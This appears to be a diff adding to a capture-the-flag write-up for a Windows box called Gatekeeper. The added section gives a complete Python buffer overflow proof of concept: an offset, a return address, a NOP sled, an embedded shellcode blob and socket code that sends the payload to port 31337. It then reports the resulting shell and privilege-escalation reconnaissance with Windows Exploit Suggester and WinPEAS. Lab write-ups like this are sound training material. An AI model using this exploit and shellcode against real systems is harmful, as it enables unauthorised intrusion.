@@ -118,4 +118,91 @@ It looks like we found the gatekeeper. Guess I'll get to use the Windows 11 dev 
 ## Exploit development
 
 I moved the file over to my dev box and fired it up in the debugger.
+Exploit development went well. No suprises and the script made everything easy.
+
+Here's the completed POC
+
+```python3
+#!/usr/bin/env python3
+
+import socket
+
+ip = "192.168.1.104"
+port = 31337
+
+prefix = " "
+offset = 145
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"
+padding = "\x90" * 16
+payload = "\xba\x43\xa3\x7c\x5b\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x15\xad\x9e\xae\x65\x59\xdc\x51\x95\x9a\x81\xd8\x70\xab\x81\xbf\xf1\x9c\x31\xcb\x57\x11\xb9\x99\x43\xa2\xcf\x35\x64\x03\x65\x60\x4b\x94\xd6\x50\xca\x16\x25\x85\x2c\x26\xe6\xd8\x2d\x6f\x1b\x10\x7f\x38\x57\x87\x6f\x4d\x2d\x14\x04\x1d\xa3\x1c\xf9\xd6\xc2\x0d\xac\x6d\x9d\x8d\x4f\xa1\x95\x87\x57\xa6\x90\x5e\xec\x1c\x6e\x61\x24\x6d\x8f\xce\x09\x41\x62\x0e\x4e\x66\x9d\x65\xa6\x94\x20\x7e\x7d\xe6\xfe\x0b\x65\x40\x74\xab\x41\x70\x59\x2a\x02\x7e\x16\x38\x4c\x63\xa9\xed\xe7\x9f\x22\x10\x27\x16\x70\x37\xe3\x72\x22\x56\xb2\xde\x85\x67\xa4\x80\x7a\xc2\xaf\x2d\x6e\x7f\xf2\x39\x43\xb2\x0c\xba\xcb\xc5\x7f\x88\x54\x7e\x17\xa0\x1d\x58\xe0\xc7\x37\x1c\x7e\x36\xb8\x5d\x57\xfd\xec\x0d\xcf\xd4\x8c\xc5\x0f\xd8\x58\x49\x5f\x76\x33\x2a\x0f\x36\xe3\xc2\x45\xb9\xdc\xf3\x66\x13\x75\x99\x9d\xf4\xba\xf6\x9c\x74\x53\x05\x9e\x65\xff\x80\x78\xef\xef\xc4\xd3\x98\x96\x4c\xaf\x39\x56\x5b\xca\x7a\xdc\x68\x2b\x34\x15\x04\x3f\xa1\xd5\x53\x1d\x64\xe9\x49\x09\xea\x78\x16\xc9\x65\x61\x81\x9e\x22\x57\xd8\x4a\xdf\xce\x72\x68\x22\x96\xbd\x28\xf9\x6b\x43\xb1\x8c\xd0\x67\xa1\x48\xd8\x23\x95\x04\x8f\xfd\x43\xe3\x79\x4c\x3d\xbd\xd6\x06\xa9\x38\x15\x99\xaf\x44\x70\x6f\x4f\xf4\x2d\x36\x70\x39\xba\xbe\x09\x27\x5a\x40\xc0\xe3\x7a\xa3\xc0\x19\x13\x7a\x81\xa3\x7e\x7d\x7c\xe7\x86\xfe\x74\x98\x7c\x1e\xfd\x9d\x39\x98\xee\xef\x52\x4d\x10\x43\x52\x44;"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+## Exploit
+
+I created a new payload and adjusted the POC to match the actual target and it worked! I got a shell as the user `natbat`. No special privileges. This is a pretty old version of windows, I could probably find a privesc vulnerability relatively easy.
+
+## Privilege Escalation
+### Windows Exploit Suggester
+
+I exfiltrated a copy of `systeminfo` and passed it to `windows-exploit-suggester.py`
+
+Then I used some grep magic to search for privesc.
+
+```bash
+cat exploitSuggester | grep Priv | grep -E "^MS..-..."
+```
+
+
+>MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+
+>MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+
+>MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+
+>MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+
+>MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
+
+>MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+
+
+### WinPEAS
+
+I used `WinPEAS.bat` to enumerate from the inside.
+
+> I keep seeing references to firefox on the target. 
+
+> WinPEAS also didn't see patches for many vulnerabilities on this machine.
+
+> The smb `Users` share is at `C:\Users\`
+
+> Hostname: Gatekeeper
+
+>The Firewall is up and running a Standard profile.
+
+> Allowed programs configuration for Standard profile:                               
+Mode     Traffic direction    Name / Program                                             
+Enable   Inbound              dostackbufferoverflowgood.exe / C:\users\mayor\desktop\dostackbufferoverflowgood.exe
+
+There seems to be some file `dostackbufferoverflowgood.exe`. I did see one internal port running...
+
+Found 2 ports that are open internally only:
+
+>   UDP    127.0.0.1:1900         *:*                                    2200
+  UDP    127.0.0.1:57514        *:*                                    2200
+
 
